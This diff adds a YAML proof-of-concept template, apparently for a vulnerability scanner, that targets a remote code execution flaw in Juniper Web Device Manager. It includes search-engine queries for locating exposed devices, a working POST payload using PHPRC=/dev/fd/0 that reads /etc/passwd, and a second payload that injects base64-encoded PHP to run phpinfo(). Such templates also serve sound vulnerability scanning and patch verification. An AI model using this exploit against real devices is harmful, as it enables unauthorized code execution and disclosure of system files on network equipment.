@@ -1,0 +1,50 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="JUNIPer-Web-Device-Manager"
+    hunter-query: app.name=="Juniper Web Device Manager"
+    quake-query: app:"Juniper Web Device Manager"
+    zoomeye-query: app:"Juniper Web Device Manager"
+    threatbook-query: 
+    cve: 
+    cnvd: 
+
+name: poc-yaml-JUNIPer-Web-PHPRC-rce
+transport: http
+set:
+  s0: randomInt(1000,9999)
+  s1: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /?PHPRC=/dev/fd/0
+      follow_redirects: false
+      headers:
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+      body: |
+        auto_prepend_file="/etc/passwd"
+    expression: >-
+      response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".matches(response.body_string)
+
+  r1:
+    request:
+      method: POST
+      path: /?PHPRC=/dev/fd/0
+      follow_redirects: false
+      headers:
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+      body: |
+        allow_url_include=1
+        auto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="
+    expression: >-
+      response.status == 200 && response.body_string.contains("phpinfo()")
+
+expression:  r0() || r1()
